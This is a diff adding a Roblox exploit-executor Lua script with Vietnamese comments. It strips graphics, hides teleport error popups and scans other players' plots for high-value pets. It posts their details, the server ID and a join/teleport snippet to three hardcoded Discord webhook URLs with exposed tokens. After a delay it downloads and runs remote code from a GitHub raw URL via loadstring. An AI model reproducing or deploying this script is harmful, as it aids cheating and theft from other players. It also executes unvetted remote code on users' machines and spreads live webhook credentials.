@@ -1,1 +1,419 @@
-cc
+pcall(function()
+    local LogService = game:GetService("LogService")
+    local function filterLog(msg)
+        msg = tostring(msg)
+        if msg:find("TutorialArrow")
+        or msg:find("FUEController")
+        or msg:find("is not a valid member of Model") then
+            return true
+        end
+        return false
+    end
+
+    local function hookConsole()
+        LogService.MessageOut:Connect(function(msg, msgType)
+            if filterLog(msg) then return end
+            if msgType == Enum.MessageType.MessageError then
+                warn("[⚠️ Error]", msg)
+            elseif msgType == Enum.MessageType.MessageWarning then
+                print("[⚠️ Warning]", msg)
+            end
+        end)
+    end
+
+    task.spawn(hookConsole)
+    task.delay(5, hookConsole)
+end)
+
+repeat task.wait() until game:IsLoaded()
+
+--// Services
+local Players     = game:GetService('Players')
+local Lighting    = game:GetService('Lighting')
+local RunService  = game:GetService('RunService')
+local UIS         = game:GetService('UserInputService')
+local HttpService = game:GetService('HttpService')
+local LP          = Players.LocalPlayer
+
+--==================================================
+-- 1) TỐI ƯU ĐỒ HỌA / FIX LAG
+--==================================================
+pcall(function()
+    local rs = settings():GetService('RenderSettings')
+    if rs then rs.QualityLevel = Enum.QualityLevel.Level01 end
+end)
+
+pcall(function()
+    Lighting.GlobalShadows = false
+    Lighting.EnvironmentDiffuseScale = 0
+    Lighting.EnvironmentSpecularScale = 0
+    Lighting.FogEnd = 1000
+    Lighting.Brightness = 1
+    Lighting.ClockTime = 12
+    Lighting.ShadowSoftness = 0
+    for _, v in ipairs(Lighting:GetChildren()) do
+        if v:IsA('BloomEffect') or v:IsA('SunRaysEffect') or v:IsA('DepthOfFieldEffect')
+        or v:IsA('BlurEffect') or v:IsA('ColorCorrectionEffect') then
+            pcall(function() v.Enabled = false end)
+        end
+    end
+    local function ensureEffect(cls, name)
+        local eff = Lighting:FindFirstChild(name)
+        if not eff then
+            local bycls = Lighting:FindFirstChildOfClass(cls)
+            if bycls then eff = bycls; eff.Name = name
+            else eff = Instance.new(cls); eff.Name = name; eff.Parent = Lighting end
+        end
+        pcall(function() eff.Enabled = false end)
+    end
+    ensureEffect('SunRaysEffect', 'SunRays')
+    ensureEffect('BloomEffect', 'Bloom')
+    ensureEffect('DepthOfFieldEffect', 'DepthOfField')
+    ensureEffect('BlurEffect', 'Blur')
+    ensureEffect('ColorCorrectionEffect', 'ColorCorrection')
+end)
+
+pcall(function()
+    local Terrain = workspace:FindFirstChildOfClass('Terrain')
+    if Terrain then
+        Terrain.WaterWaveSize = 0
+        Terrain.WaterWaveSpeed = 0
+        Terrain.WaterReflectance = 0
+        Terrain.WaterTransparency = 1
+    end
+    workspace.StreamingEnabled = true
+    workspace.LevelOfDetail = Enum.ModelLevelOfDetail.Disabled
+end)
+
+local okDesc, descs = pcall(workspace.GetDescendants, workspace)
+if okDesc and type(descs) == 'table' then
+    for _, inst in ipairs(descs) do
+        if inst:IsA('BasePart') then
+            pcall(function()
+                inst.Material = Enum.Material.SmoothPlastic
+                inst.CastShadow = false
+                inst.Reflectance = 0
+            end)
+        elseif inst:IsA('ParticleEmitter') or inst:IsA('Trail') or inst:IsA('Fire')
+            or inst:IsA('Smoke') or inst:IsA('Sparkles') then
+            pcall(function() inst.Enabled = false end)
+        elseif inst:IsA('Decal') or inst:IsA('Texture') then
+            pcall(function()
+                inst.Transparency = 1
+                inst.ZIndex = 0
+            end)
+        elseif inst:IsA('SurfaceAppearance') then
+            pcall(function() inst:Destroy() end)
+        end
+    end
+end
+
+print('✅ Đã tối ưu đồ họa xong!')
+
+--==================================================
+-- 2) WHITE SCREEN + TIMER (toggle P)
+--==================================================
+local WHITE_ON_START = true
+local TOGGLE_KEY = Enum.KeyCode.P
+local WhiteGui, WhiteFrame, TimerLabel, WhiteOn = nil, nil, nil, false
+local startTime = tick()
+
+local function ensureWhite()
+    if WhiteGui and WhiteGui.Parent then return end
+    local pg = nil
+    local ok = pcall(function() pg = LP and LP:WaitForChild('PlayerGui', 10) end)
+    if not ok or not pg then return end
+
+    WhiteGui = Instance.new('ScreenGui')
+    WhiteGui.Name = 'WhiteOverlay'
+    WhiteGui.ResetOnSpawn = false
+    WhiteGui.IgnoreGuiInset = true
+    WhiteGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    WhiteGui.Parent = pg
+
+    WhiteFrame = Instance.new('Frame')
+    WhiteFrame.Size = UDim2.fromScale(1, 1)
+    WhiteFrame.BackgroundColor3 = Color3.new(1, 1, 1)
+    WhiteFrame.BorderSizePixel = 0
+    WhiteFrame.Visible = false
+    WhiteFrame.Parent = WhiteGui
+
+    TimerLabel = Instance.new('TextLabel')
+    TimerLabel.Size = UDim2.new(0, 300, 0, 100)
+    TimerLabel.Position = UDim2.fromScale(0.5, 0.5)
+    TimerLabel.AnchorPoint = Vector2.new(0.5, 0.5)
+    TimerLabel.BackgroundTransparency = 1
+    TimerLabel.Text = '00:00:00'
+    TimerLabel.TextColor3 = Color3.new(0, 0, 0)
+    TimerLabel.TextSize = 48
+    TimerLabel.Font = Enum.Font.GothamBold
+    TimerLabel.TextStrokeTransparency = 0.8
+    TimerLabel.Parent = WhiteFrame
+end
+
+local function setWhite(b)
+    if not (WhiteGui and WhiteGui.Parent) then ensureWhite() end
+    if not (WhiteGui and WhiteGui.Parent) then return end
+    WhiteOn = b and true or false
+    if WhiteFrame then WhiteFrame.Visible = WhiteOn end
+end
+
+pcall(function()
+    UIS.InputBegan:Connect(function(input, gpe)
+        if gpe then return end
+        if input.KeyCode == TOGGLE_KEY then
+            setWhite(not WhiteOn)
+        end
+    end)
+end)
+
+if WHITE_ON_START then setWhite(true) end
+
+task.spawn(function()
+    RunService.RenderStepped:Connect(function()
+        if TimerLabel then
+            local elapsed = tick() - startTime
+            local h = math.floor(elapsed / 3600)
+            local m = math.floor((elapsed % 3600) / 60)
+            local s = math.floor(elapsed % 60)
+            TimerLabel.Text = string.format('%02d:%02d:%02d', h, m, s)
+        end
+    end)
+end)
+
+--==================================================
+-- 3) ẨN BẢNG LỖI TELEPORT
+--==================================================
+task.spawn(function()
+    while task.wait(3) do
+        pcall(function()
+            local pg = LP:FindFirstChild('PlayerGui')
+            if pg then
+                for _, gui in ipairs(pg:GetChildren()) do
+                    if gui:IsA('ScreenGui') and gui.Enabled then
+                        for _, frame in ipairs(gui:GetDescendants()) do
+                            if frame:IsA('Frame') or frame:IsA('ImageLabel') then
+                                for _, t in ipairs(frame:GetDescendants()) do
+                                    if t:IsA('TextLabel') or t:IsA('TextButton') then
+                                        local text = string.lower(t.Text or '')
+                                        if text:find('772') then
+                                            frame.Visible = false
+                                            gui.Enabled = false
+                                            break
+                                        end
+                                    end
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+        end)
+    end
+end)
+
+-- ⚙️ CONFIG
+getgenv().webhookHighlight = "https://discord.com/api/webhooks/1439622126565855327/pJ51aExXrSBQ2RdArxBnHOJ8b3c1tNSCBoUNBOYzIYncM86o5zo7tXgGmLioKCIdO5_c"
+getgenv().webhookHigh      = "https://discord.com/api/webhooks/1439621917584654438/ye5VPo_crXuUhFF7TFzBkBhTrK_HyvcjpfCKoPsiKhW7WtYH7nq0wRMtYBLSIRyPww_q"
+getgenv().webhookLow       = "https://discord.com/api/webhooks/1439621521042702529/gqJDaVCQ7SIJr_hhiqr4EdaZ2s0JdOpNn5icxhxo_7FHp7CmdvqEO2S-kCpmN9SpzG4N"
+
+getgenv().HighlightMin = 10_000_000 -- pets ≥10M
+getgenv().HighMin      = 10_000_000 -- pets ≥10M
+getgenv().LowMin       = 1_000_000
+getgenv().LowMax       = 10_000_000
+
+local HttpService = game:GetService("HttpService")
+local Players     = game:GetService("Players")
+local Workspace   = game:GetService("Workspace")
+
+local function parseMoney(str)
+    if not str or str == "" then return 0 end
+    local num, suffix = str:match("([%d%.]+)%s*([KMBT]?)")
+    num = tonumber(num)
+    if not num then return 0 end
+    local mult = ({ K=1e3, M=1e6, B=1e9, T=1e12 })[suffix:upper()] or 1
+    return num * mult
+end
+
+-- Get object text
+local function getObjectText(obj)
+    if not obj then return nil end
+    if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then
+        return obj.Text
+    elseif obj:IsA("StringValue") or obj:IsA("IntValue") or obj:IsA("NumberValue") then
+        return obj.Value
+    else
+        return obj.Name
+    end
+end
+
+-- Scan pets in plot
+local function scanPets(plot)
+    local pets = {}
+    for _, obj in ipairs(plot:GetDescendants()) do
+        local display, gen
+        for _, child in ipairs(obj:GetDescendants()) do
+            local n = child.Name:lower()
+            if n:match("displayname") or n:match("display") then
+                display = child
+            elseif n:match("generation") or n:match("gen") then
+                gen = child
+            end
+        end
+
+        if display and gen then
+            local nameText = getObjectText(display) or "???"
+            local genText  = getObjectText(gen) or "$???/s"
+            local value    = parseMoney(genText)
+
+            table.insert(pets, {
+                name = nameText,
+                gen  = genText,
+                value = value
+            })
+        end
+    end
+    return pets
+end
+
+local function sendWebhook(pets, webhookURL, embedColor)
+    if #pets == 0 or not webhookURL then return end
+
+    local petLines = {}
+    for _, pet in ipairs(pets) do
+        table.insert(petLines, string.format("• %s [%s]", pet.name, pet.gen))
+    end
+
+    table.insert(petLines, string.format("👥 Players %d/%d", #Players:GetPlayers(), Players.MaxPlayers))
+
+    local petText = "```text\n" .. table.concat(petLines, "\n") .. "\n```"
+
+    local joinLink = string.format(
+        "https://chillihub1.github.io/chillihub-joiner/?placeId=%d&gameInstanceId=%s",
+        game.PlaceId, game.JobId
+    )
+
+    local tpScript = string.format(
+        "game:GetService('TeleportService'):TeleportToPlaceInstance(%d, '%s', game.Players.LocalPlayer)",
+        game.PlaceId, game.JobId
+    )
+
+    local embed = {
+        username = "𝐃𝐞𝐧𝐊𝐚𝐢",
+        embeds = {{
+            title = "𝐁𝐫𝐚𝐢𝐧𝐫𝐨𝐭 𝐍𝐨𝐭𝐢𝐟𝐲 | 𝐃𝐞𝐧𝐤𝐚𝐢",
+            description = string.format(
+                "%s\n🆔 𝐉𝐨𝐛𝐈𝐃 `%s`\n🌐 𝐉𝐨𝐢𝐧 𝐋𝐢𝐧𝐤 [Click to Join](%s)\n📜 𝐓𝐞𝐥𝐞𝐩𝐨𝐫𝐭\n```lua\n%s\n```",
+                petText, game.JobId, joinLink, tpScript
+            ),
+            color = embedColor,
+            footer = { text = "𝐌𝐚𝐝𝐞 𝐛𝐲 𝐊𝐡𝐚𝐢𝐧𝐠𝐮𝐲𝐞𝐧" },
+            timestamp = DateTime.now():ToIsoDate()
+        }}
+    }
+
+    local json = HttpService:JSONEncode(embed)
+    local req = http_request or request or (syn and syn.request) or (http and http.request)
+    if not req then return end
+
+    pcall(function()
+        req({
+            Url = webhookURL,
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = json
+        })
+    end)
+end
+
+local function sendHighlightWebhook(pets, webhookURL)
+    if #pets == 0 or not webhookURL then return end
+
+    local petLines = {}
+    for _, pet in ipairs(pets) do
+        table.insert(petLines, string.format("• %s [%s]", pet.name, pet.gen))
+    end
+
+    local petText = "```text\n" .. table.concat(petLines, "\n") .. "\n```"
+
+    local embed = {
+        username = "𝐇𝐢𝐠𝐡𝐥𝐢𝐠𝐡𝐬",
+        embeds = { {
+            title = "𝐁𝐫𝐚𝐢𝐧𝐫𝐨𝐭 𝐍𝐨𝐭𝐢𝐟𝐲 | 𝐃𝐞𝐧𝐤𝐚𝐢",
+            description = petText,
+            color = 0xFFB6C1,
+            footer = { text = "𝐌𝐚𝐝𝐞 𝐛𝐲 𝐊𝐡𝐚𝐢𝐧𝐠𝐮𝐲𝐞𝐧" },
+            timestamp = DateTime.now():ToIsoDate()
+        } }
+    }
+
+    local json = HttpService:JSONEncode(embed)
+    local req = http_request or request or (syn and syn.request) or (http and http.request)
+    if not req then return end
+
+    pcall(function()
+        req({
+            Url = webhookURL,
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = json
+        })
+    end)
+end
+
+
+local sentHighlight = {}
+local sentHigh = {}
+local sentLow = {}
+
+task.spawn(function()
+    while true do
+        for _, plot in pairs(Workspace.Plots:GetChildren()) do
+            local allPets = scanPets(plot)
+            local highlight, high, low = {}, {}, {}
+
+            for _, pet in ipairs(allPets) do
+                local id = pet.name .. "|" .. pet.gen
+
+                if pet.value >= getgenv().HighlightMin and not sentHighlight[id] then
+                    table.insert(highlight, pet)
+                    sentHighlight[id] = true
+                end
+
+                if pet.value >= getgenv().HighMin and not sentHigh[id] then
+                    table.insert(high, pet)
+                    sentHigh[id] = true
+                end
+
+                if pet.value >= getgenv().LowMin and pet.value <= getgenv().LowMax and not sentLow[id] then
+                    table.insert(low, pet)
+                    sentLow[id] = true
+                end
+            end
+
+            if #highlight > 0 then
+                sendHighlightWebhook(highlight, getgenv().webhookHighlight)
+            end
+            if #high > 0 then
+                sendWebhook(high, getgenv().webhookHigh, 0xFF0000)
+            end
+            if #low > 0 then
+                sendWebhook(low, getgenv().webhookLow, 0x00AAFF)
+            end
+        end
+        task.wait(1)
+    end
+end)
+print("DenKai Hop3s")
+--==================================================
+-- 7) LOAD WEBSOCKET SAU 3S
+--==================================================
+task.delay(6, function()
+    local url = "https://raw.githubusercontent.com/khainguyensteal-lang/KhaiNguyen/refs/heads/main/AutoJoinerDenKai"
+    print("🌐 Đang tải websocket script sau 3s...")
+    local ok, res = pcall(function()
+        loadstring(game:HttpGet(url))()
+    end)
+    if ok then print("✅ Websocket script loaded!") else warn("❌ Lỗi websocket:", res) 
+    end
+end)
